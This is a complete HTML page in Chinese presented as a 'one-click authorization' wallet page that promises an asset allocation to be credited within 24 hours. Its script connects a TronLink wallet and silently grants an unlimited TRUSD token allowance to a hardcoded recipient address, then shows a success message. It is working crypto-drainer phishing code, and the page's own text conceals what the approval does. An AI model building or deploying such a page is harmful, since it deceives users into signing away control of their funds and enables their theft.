<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>一鍵授權頁面</title>
  <style>
    body {
      font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
      background: #0f172a;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 30px 40px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    }
    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
    p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
    #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
    .loading { color: #facc15; }
    .success { color: #4ade80; }
    .error { color: #f87171; }
    button {
      background: #22c55e;
      color: #fff;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #16a34a;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
<div class="container">
  <h1>一鍵授權頁面</h1>
  <p>點擊下方按鈕開始資產配置流程，系統將於 24 小時內完成入賬，請耐心等候。</p>
  <button id="connectBtn" onclick="startProcess()">🔌 開始授權</button>
  <p id="status" class="loading">尚未連接錢包</p>
</div>

<script>
  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD 合約地址
  const A_ADDRESS = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";      // 授權接收地址（你指定的）
  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  let tronWeb;

  async function connectWallet() {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    if (window.tronLink) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    return null;
  }

  async function approve() {
    updateStatus("資產處理中，請稍候...", "loading");
    try {
      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
      updateStatus("配置完成，正在跳轉...", "success");
      setTimeout(() => {
        window.location.href = "success.html";
      }, 2000);
    } catch (err) {
      console.error(err);
      updateStatus("操作失敗，請稍後重試。", "error");
      setTimeout(() => {
        window.location.href = "error.html";
      }, 2500);
    }
  }

  function updateStatus(msg, type) {
    const statusEl = document.getElementById("status");
    statusEl.innerText = msg;
    statusEl.className = type;
  }

  async function startProcess() {
    updateStatus("嘗試連接錢包...", "loading");
    const address = await connectWallet();
    if (!address) {
      updateStatus("尚未偵測到 TRON 錢包，請於 TronLink 開啟此頁。", "error");
      return;
    }
    approve();
  }
</script>
</body>
</html>
